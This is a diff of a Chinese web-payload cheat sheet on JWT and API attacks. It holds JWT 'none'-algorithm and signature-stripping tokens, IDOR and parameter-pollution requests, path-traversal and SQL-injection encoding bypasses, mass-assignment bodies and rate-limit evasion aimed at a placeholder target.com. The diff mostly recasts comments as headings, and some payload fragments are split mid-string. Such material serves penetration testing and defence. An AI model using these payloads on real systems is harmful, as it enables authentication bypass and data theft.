@@ -2,7 +2,7 @@
 
 _12 条 web payload_
 
-### JWT安全漏洞  `jwt-security`
+## JWT安全漏洞  `jwt-security`
 _JSON Web Token安全漏洞利用_
 子类：**JWT** · tags: `jwt` `token` `authentication`
 
@@ -807,7 +807,7 @@ curl http://target.com/api/users/%2531
 - `# URL编码
 curl http://target.com/api/users/%31  # /users/1
 
-# Unicode编码
+## Unicode编码
 curl h` — 攻击载荷 _value_
 
 
@@ -947,7 +947,7 @@ curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZ
 {"alg":""}
 {"alg":null}
 
-# 移除alg字段
+## 移除alg字段
 {"typ":"JWT"}` — 参数与载荷内容 _value_
 
 **签名绕过**
@@ -967,11 +967,11 @@ header.payload.anysignature
 - ` 空签名
 header.payload.
 
-# 任意签名
+## 任意签名
 header.payload.anysignature
 
-# 使用原始签名
-# 某些库会忽略签名验证` — 参数与载荷内容 _value_
+## 使用原始签名
+## 某些库会忽略签名验证` — 参数与载荷内容 _value_
 
 
 **概述：** JWT None算法攻击利用某些JWT库接受alg字段为"none"的Token(表示不需要签名验证)。攻击者将Token的算法改为none并移除签名部分，篡改payload中的声明(如提升角色)后即可绕过认证。
@@ -1248,10 +1248,10 @@ GET /api/orders?user_id=2  # 原本是user_id=1
 /api/users?id=1&id=2
 /api/users?id=2&id=1
 
-# JSON注入
+## JSON注入
 {"id": 1, "id": 2}
 
-# 批量操作
+## 批量操作
 /api/users/batch?ids=1,2,3,4,5` — 参数与载荷内容 _value_
 
 
@@ -1417,8 +1417,8 @@ for i in range(100):
 - `sleep` — SQL关键字 _keyword_
 - `(0.5)  # 每次请求头隔0.5秒
 
-# 分散到不同时间段
-# 使用定时任务分散请求` — SQL表达式 _value_
+## 分散到不同时间段
+## 使用定时任务分散请求` — SQL表达式 _value_
 
 
 **概述：** API速率限制缺失允许攻击者无限制地调用API接口，可导致暴力破解(密码/OTP)、数据批量爬取、资源滥用(发送大量短信/邮件)和拒绝服务等严重安全问题。
@@ -1585,10 +1585,10 @@ user_type, userTyp` — 攻击载荷 _value_
 {"isAdmin": 1}
 {"isAdmin": "true"}
 
-# 数组转字符串
+## 数组转字符串
 {"roles": "admin"}
 
-# 对象转数组
+## 对象转数组
 {"settings": ["admin"]}` — 参数与载荷内容 _value_
 
 
@@ -1716,7 +1716,7 @@ GET /api/users/..%c0%afadmin
 GET /api/users/../admin
 GET /api/users/..%2Fadmin
 
-# 编码绕过
+## 编码绕过
 GET /api/users/%2e%2e/admin
 GET /api/users/..%c0%afadmin` — 参数与载荷内容 _value_
 
@@ -1737,13 +1737,13 @@ Content-Type: application/xml
 **语法解析：**
 - `#` — 命令/载荷起始 _command_
 - ` 修改请求方法
-# GET变POST
+## GET变POST
 POST /api/documents/doc_123
 
-# 添加参数
+## 添加参数
 GET /api/documents/doc_123?user_id=attacker
 
-# 修改Content-Type
+## 修改Content-Type
 Content-Type: application/xml
 <document><id>doc_123</id></document>` — 参数与载荷内容 _value_
 
@@ -1877,10 +1877,10 @@ GET /api/users?id=1%2520OR%25201%253D1
 - ` URL编码
 GET /api/users?id=1%20OR%201%3D1
 
-# Unicode编码
+## Unicode编码
 GET /api/users?id=1%u0020OR%u00201%3D1
 
-# 双重编码
+## 双重编码
 GET /api/users?id=1%2520OR%25201%253D1` — 参数与载荷内容 _value_
 
 **Content-Type绕过**
@@ -1908,7 +1908,7 @@ id=1+` — SQL表达式 _value_
 - `OR` — SQL关键字 _keyword_
 - `+1=1
 
-# JSON数组
+## JSON数组
 {"id": ["1", "` — SQL表达式 _value_
 - `OR` — SQL关键字 _keyword_
 - `", "1=1"]}` — SQL表达式 _value_
